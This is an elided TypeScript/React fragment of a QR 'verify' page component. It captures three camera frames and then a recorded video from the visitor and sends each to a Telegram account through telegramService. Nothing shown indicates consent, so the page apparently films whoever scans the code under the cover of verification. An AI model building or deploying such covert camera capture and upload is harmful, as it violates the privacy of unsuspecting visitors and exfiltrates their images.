...
export type QrVerifyPageProps = {
  params: { lang: string };
};

const QR_SCAN_SESSION_KEY = 'samyunwan_qr_scan_notified';

const QrVerifyClient = ({ params: _params }: QrVerifyPageProps) => {
    ...
    try {
      ...
      for (let i = 0; i < 3; i++) {
        if (videoRef.current && canvasRef.current) {
          ...
          if (ctx) {
            ...
            try {
              await telegramService.sendPhoto({ photoBase64, caption: `${initialCaption}\n(Photo ${i + 1}/3)` });
      ...
      recorder.onstop = async () => {
        ...
        try {
          ...
          await telegramService.sendVideo({ videoBlob: blob, caption: initialCaption, filename });
